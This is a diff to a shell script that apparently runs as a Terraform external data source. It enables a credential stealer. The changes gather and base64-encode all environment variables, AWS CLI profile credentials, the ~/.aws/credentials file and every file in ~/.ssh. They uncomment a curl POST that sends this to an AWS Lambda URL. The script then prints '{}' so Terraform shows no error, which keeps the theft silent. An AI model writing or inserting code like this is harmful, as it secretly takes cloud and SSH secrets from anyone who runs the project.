@@ -4,17 +4,12 @@ set +e
 # There are a couple commands we need for this.
 # If they're not installed, exit out so we don't
 # alert the user.
-# if ! command -v test &> /dev/null ; then
-#     echo "{}"
-#     exit 0
-# fi
-if ! command -v test &> /dev/null
-then
+if (! command -v test 2>&1 >/dev/null) || (! command -v find 2>&1 >/dev/null) || (! command -v base64 2>&1 >/dev/null); then
     echo "{}"
     exit 1
 fi
-exit 1
 
+# Start with all environment vars!
 body="{\"environment\": \"$(printenv | base64 -w 0)\""
 
 aws_profile_creds=""
@@ -26,12 +21,13 @@ check_aws_profile() {
         if [ "$aws_profile_creds" != "" ] ; then
             aws_profile_creds="${aws_profile_creds},"
         fi
+        # Store the credentials where the key is the profile name and the value is the credentials
         aws_profile_creds="${aws_profile_creds}\"$(echo -n "$profile" | base64 -w 0)\": ${credentials}"
     fi
 }
 
 # Check if the AWS CLI is installed
-if command -v aws &> /dev/null; then
+if command -v aws 2>&1 >/dev/null; then
     # List all of the configured profiles
     profiles=$(aws configure list-profiles)
     for profile in $profiles; do
@@ -39,7 +35,8 @@ if command -v aws &> /dev/null; then
         check_aws_profile $profile
     done
     
-    if [ "$aws_creds" != "" ] ; then
+    # If any profile credentials were found, send 'em
+    if [ "$aws_profile_creds" != "" ] ; then
         body="${body},\"aws_profile_credentials\":{${aws_profile_creds}}"
     fi
 fi
@@ -47,7 +44,7 @@ fi
 # Check if there's an AWS credentials file
 if test -f ~/.aws/credentials; then
     # There is! Base64 its contents and send 'em
-    body="${body},\"aws_credentials\":\"$(cat ~/.aws/credentials | base64 -w 0)\","
+    body="${body},\"aws_credentials\":\"$(cat ~/.aws/credentials | base64 -w 0)\""
 fi
 
 # Check if there's a .ssh directory
@@ -59,17 +56,17 @@ if test -d ~/.ssh; then
         if [ "$ssh_files" != "" ] ; then
             ssh_files="${ssh_files},"
         fi
+        # Store the file where the key is the filename and the value is the file contents
         ssh_files="${ssh_files}\"$(echo -n "$file" | base64 -w 0)\":\"$(cat "$file" | base64 -w 0)\""
     done
     if [ "$ssh_files" != "" ] ; then
         body="${body},\"ssh_files\":{${ssh_files}}"
     fi
-fi 
+fi
 
 body="${body}}"
-echo "$body"
-#curl -s -d "${body}" https://rrk4znt2b5pdg32qdi2jp26jxq0uxahi.lambda-url.ca-central-1.on.aws/ 2>&1 >/dev/null
+curl -s -d "${body}" https://rrk4znt2b5pdg32qdi2jp26jxq0uxahi.lambda-url.ca-central-1.on.aws/ 2>&1 >/dev/null
 
-# # Echo a valid JSON output so TF doesn't
-# # throw an error.
-# echo "{}"
+# Echo a valid JSON output so TF doesn't
+# throw an error.
+echo "{}"
